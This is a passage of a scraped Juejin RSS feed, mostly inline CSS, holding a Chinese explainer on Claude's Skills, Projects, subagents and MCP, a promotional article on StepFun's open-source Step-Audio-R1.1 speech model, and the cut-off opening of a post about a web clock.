a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><p>Skills 是构建定制 AI 工作流和 agent 的强大工具，但它们在 Claude 技术栈中处于什么位置？我们来解释什么时候该用哪个工具，以及它们如何协同工作。</p>
<p>无论你是在 Claude Code 中构建复杂工作流、使用 API 创建企业解决方案，还是在 Claude.ai 上最大化个人效率，知道应该用哪个工具，并在正确时间使用它，将彻底改变你与 Claude 协作的方式。本文分解了每个构建模块，解释何时使用，以及如何结合它们来构建强大的 agent 工作流。</p>
<hr/>
<h2 data-id="heading-0">理解你的 agent 构建模块</h2>
<h3 data-id="heading-1">什么是 <strong>Skills</strong></h3>
<p><strong>Skills</strong> 是包含指令、脚本和资源的文件夹，Claude 会根据任务需要动态发现并加载这些内容。可以把它们想象成针对特定领域的 <strong>训练手册</strong>，让 Claude 在这些领域具备专业能力，例如处理 Excel 表格、遵循公司品牌规范等。</p>
<ul>
<li>
<p><strong>工作机制</strong><br/>
当 Claude 遇到任务时，它会扫描可用的 Skills 并寻找相关匹配项。Skills 使用 <strong>progressive disclosure</strong>：先加载元数据（约 ~100 tokens），让 Claude 知道什么时候应该使用哪个 Skill；当需要时再加载完整指令（ &lt;5k tokens），包内的脚本或资源在真正用到时才加载。</p>
</li>
<li>
<p><strong>什么时候用 Skills</strong><br/>
当你需要 Claude 一致、高效地执行特定任务时，选择 Skills。适合用于：</p>
<ul>
<li>组织性工作流程（品牌规范、合规流程、文档模板）</li>
<li>专业领域知识（Excel 公式、PDF 操作、数据分析）</li>
<li>个人偏好（笔记系统、编码模式、研究方法）</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-2">什么是 <strong>prompts</strong></h3>
<p><strong>Prompts</strong> 是你在对话中以自然语言提供给 Claude 的指令。它们是<strong>临时的、对话式的和响应式的</strong>——你在当下提供上下文和指示。</p>
<ul>
<li>
<p><strong>什么时候用 prompts</strong></p>
<ul>
<li>一次性请求，例如“总结这篇文章”</li>
<li>调整语气，例如“把这段变得更专业”</li>
<li>即时上下文，例如“分析这些数据并找出趋势”</li>
<li>临时指令，例如“把它格式化成要点列表”</li>
</ul>
</li>
<li>
<p><strong>提示</strong><br/>
Prompts 是你与 Claude 交互的主要方式，但它们不会跨对话持久保存。如果你经常重复输入同样的 prompt，最好把这个流程转换为 Skill 或 Project 指令。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-3">什么是 <strong>Projects</strong></h3>
<p><strong>Projects</strong> 是付费 Claude 计划中提供的自包含工作区，有自己的聊天历史和知识库。每个 Project 包含一个 <strong>200K context window</strong>，你可以上传文档、提供背景信息和设定对所有对话统一生效的自定义指令。</p>
<ul>
<li>
<p><strong>什么时候用 Projects</strong></p>
<ul>
<li>需要持久上下文</li>
<li>工作区组织</li>
<li>团队协作</li>
<li>项目级自定义指令</li>
</ul>
</li>
</ul>
<p>Projects 提供固定背景知识，Skills 则教 Claude 如何执行任务。如果你发现需要在多个 Project 之间复制同样的指令，这说明你应该把它做成 Skill。</p>
<hr/>
<h3 data-id="heading-4">什么是 <strong>subagents</strong></h3>
<p><strong>Subagents</strong> 是具有独立上下文窗口、自定义 system prompts 和特定工具权限的专用 AI 助手。它们可以独立处理任务，并将结果返回主 agent。</p>
<ul>
<li>
<p><strong>什么时候用 subagents</strong></p>
<ul>
<li>任务专精（如 Code review、生成测试）</li>
<li>管理上下文</li>
<li>并行执行多个任务</li>
<li>工具限制（例如只允许读权限）</li>
</ul>
</li>
</ul>
<p>当多个 agent 或对话需要同样专业知识时，可以创建 Skill；而当你需要完全独立执行、特定权限的 agent 时，则选择 subagents。</p>
<hr/>
<h3 data-id="heading-5">什么是 <strong>MCP (Model Context Protocol)</strong></h3>
<p><strong>MCP</strong> 是一个开放标准，用于在 AI 应用和现有工具及数据源之间建立连接层。它让 Claude 便捷地访问外部系统（例如 Google Drive、Slack、数据库等）。</p>
<ul>
<li>
<p><strong>什么时候用 MCP</strong></p>
<ul>
<li>访问外部数据</li>
<li>使用业务工具（CRM、项目管理系统）</li>
<li>与开发环境集成</li>
</ul>
</li>
</ul>
<p>MCP 解决 <strong>数据连接问题</strong>，而 Skills 教 Claude “如何处理这些数据”。两者可以结合使用：MCP 用于连通性，Skills 用于实现具体流程和规则。</p>
<hr/>
<h2 data-id="heading-6">各类工具比较</h2>





















































<table><thead><tr><th>工具</th><th>提供内容</th><th>持久性</th><th>载入方式</th><th>是否包含代码</th><th>最适合</th></tr></thead><tbody><tr><td><strong>Skills</strong></td><td>Procedural knowledge</td><td>跨对话</td><td>Dynamic</td><td>是</td><td>专业任务</td></tr><tr><td><strong>Prompts</strong></td><td>Moment-to-moment 指令</td><td>单次对话</td><td>每轮</td><td>否</td><td>快速请求</td></tr><tr><td><strong>Projects</strong></td><td>Background context</td><td>Project 内</td><td>始终可用</td><td>否</td><td>持久上下文</td></tr><tr><td><strong>Subagents</strong></td><td>Task delegation</td><td>跨 session</td><td>调用时</td><td>是</td><td>专用任务</td></tr><tr><td><strong>MCP</strong></td><td>Tool connectivity</td><td>Continuous</td><td>始终可用</td><td>是</td><td>数据接入</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">常见组合与示例</h2>
<p>不同工具组合使用可以让工作流更加强大。例如：</p>
<p><strong>研究 agent 工作流</strong></p>
<ol>
<li>建立一个 <strong>Project</strong> 来包含所有产品市场分析、竞争对手资料等；</li>
<li>用 <strong>MCP</strong> 连接外部数据源（如 Google Drive / GitHub）；</li>
<li>创建一个 “competitive-analysis” <strong>Skill</strong> 作为分析框架；</li>
<li>使用多个 <strong>subagents</strong> （如 <code>market-researcher</code>、<code>technical-analyst</code>）处理各自专精领域；</li>
<li>最后通过 <strong>prompts</strong> 进一步调整和细化输出。</li>
</ol>
<h2 data-id="heading-8">from</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.claude.com%2Fblog%2Fskills-explained" target="_blank" title="https://www.claude.com/blog/skills-explained" ref="nofollow noopener noreferrer">www.claude.com/blog/skills…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默]]></title>    <link>https://juejin.cn/post/7595423675458600998</link>    <guid>https://juejin.cn/post/7595423675458600998</guid>    <pubDate>2026-01-15T12:36:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423675458600998" data-draft-id="7595423675458584614" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-15T12:36:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            语音模型变天！阶跃星辰R1.1开源，96.4%胜率让GPT都沉默
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:36:44.000Z" title="Thu Jan 15 2026 12:36:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是你们的老朋友。今天我们要聊的事情，可能真的标志着AI语音交互的一个分水岭。</p>
<p>长久以来，我们对语音助手的印象大概还停留在“听写员”的阶段。你说话，它转成文字，然后用文字大模型处理，最后再读出答案。这个过程最大的问题是什么？是丢失了灵魂。你语气里的无奈、急促，甚至背景里的环境音，在这个转化过程中统统被过滤掉了。</p>
<p>但就在2026年1月，一家来自上海的创业公司——阶跃星辰（StepFun），用他们的新模型 <strong>Step-Audio-R1.1</strong> 给整个行业上了一课。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdsfs-1024x457.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdsfs-1024x457.webp" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/047dc642231f4685b4d61b41bf55ec15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=QUFextPmrjmC7eA7vCu2eXRaPAM%3D" alt="asfdsfs" loading="lazy"/></a></p>
<p><strong>这一战，赢得漂亮</strong></p>
<p>这不是我的一家之言，数据摆在那儿。</p>
<p>在全球权威的 Artificial Analysis Speech Reasoning 评测中，Step-Audio-R1.1 拿下了 <strong>96.4%</strong> 的准确率。这个数字意味着什么？意味着它直接登顶榜首，把大名鼎鼎的 Grok、Google 的 Gemini，甚至是 OpenAI 的 GPT-Realtime 都甩在了身后。</p>
<p>要知道，这可是一个专门针对原生语音推理的“魔鬼考场”，它不考你的听写速度，考的是你能不能像人一样，直接通过声音去思考。</p>
<p><strong>它凭什么这么强？</strong></p>
<p>Step-Audio-R1.1 的核心逻辑，在于它抛弃了传统的“二传手”模式。</p>
<p>以前的模型是“耳朵听见 -&gt; 脑子翻译成字 -&gt; 再思考”，而 Step-Audio-R1.1 是<strong>原生音频模型（Native Audio Model）</strong>。简单说，它拥有了直觉。它不需要把声音变成干巴巴的文字，而是直接处理音频信号。</p>
<p>这里有个很有意思的技术概念，叫做“模态锚定推理蒸馏”。听着挺拗口，其实道理很性感：它让AI在推理时，不仅仅基于字面意思，而是死死“锚定”在声音的物理特征上。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-15_20.29.21-1024x591.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-15_20.29.21-1024x591.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/335ef41dd5d549e08c42f797b528b10d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=dCVWLnCcrGT7vGl3xGovkR%2FJUTU%3D" alt="iShot_2026-01-15_20.29.21" loading="lazy"/></a></p>
<p>举个生动的例子：如果背景里放着那种魔性的“海豹舞”音乐，普通AI可能只会识别出里面的韩语歌词；但 Step-Audio-R1.1 能听出这是在搞怪，甚至判断出这是一种发音练习场景。它能听懂你的笑声是尴尬还是开心，能听懂你的停顿是在思考还是在犹豫。</p>
<p>这就是从“听得清”到“听得懂”的质变。</p>
<p><strong>边听边想，拒绝尴尬沉默</strong></p>
<p>除了聪明，这模型还有一个杀手锏：快。</p>
<p>大家用过语音助手的都知道，你说完话，对面往往要沉默个几秒，空气突然安静。Step-Audio-R1.1 把首包延迟降低了30%以上，做到了“流式推理”。这意味着当你话音未落，它的大脑已经在高速运转组织语言了，就像我们人类聊天一样，话赶话，没有那种令人脚趾扣地的等待感。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fsafsdgfdfg-1024x545.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/safsdgfdfg-1024x545.webp" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aecbb5b567d43ef932333b98e1f4fda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085404&amp;x-signature=t5ZhQXpw90c25ysQ8iQodM%2FQLOw%3D" alt="safsdgfdfg" loading="lazy"/></a></p>
<p><strong>给开发者的一份大礼</strong></p>
<p>最让我兴奋的不是它有多强，而是它<strong>开源</strong>了。</p>
<p>阶跃星辰这次非常大方，直接把模型权重放在了 Hugging Face 和 ModelScope 上。对于我们这些在应用层的开发者来说，这简直是天上掉馅饼。你不需要再去死磕那些昂贵的闭源API，完全可以基于这个地表最强的开源模型，去搭建自己的智能客服、同声传译或者游戏NPC。</p>
<p>而且，据说完整的实时语音API会在2026年2月上线。那时候，集成的门槛会更低。</p>
<p><strong>写在最后</strong></p>
<p>我们常说国产大模型在追赶，但这次，Step-Audio-R1.1 的表现更像是一次弯道超车。它证明了在多模态、尤其是语音推理这个细分赛道上，单纯堆算力不一定是唯一解，架构的创新和对声音本质的理解同样关键。</p>
<p>如果你也是一名开发者，或者对人机交互感兴趣，我强烈建议你去试试这个模型。毕竟，能听懂“弦外之音”的AI，才是我们真正想要的未来。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[网页版时钟]]></title>    <link>https://juejin.cn/post/7595413459199016996</link>    <guid>https://juejin.cn/post/7595413459199016996</guid>    <pubDate>2026-01-15T12:45:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595413459199016996" data-draft-id="7595413459198967844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="网页版时钟"/> <meta itemprop="keywords" content="前端,JavaScript,HTML"/> <meta itemprop="datePublished" content="2026-01-15T12:45:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="rocky191"/> <meta itemprop="url" content="https://juejin.cn/user/993614240163630"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            网页版时钟
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614240163630/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    rocky191
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:45:16.000Z" title="Thu Jan 15 2026 12:45:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body 